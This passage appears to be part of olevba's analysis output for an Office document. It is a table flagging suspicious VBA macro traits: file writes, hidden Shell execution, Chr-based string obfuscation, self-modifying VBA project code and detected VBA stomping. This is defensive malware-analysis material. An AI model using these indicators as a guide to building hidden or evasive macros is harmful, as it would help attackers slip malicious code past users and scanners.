|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

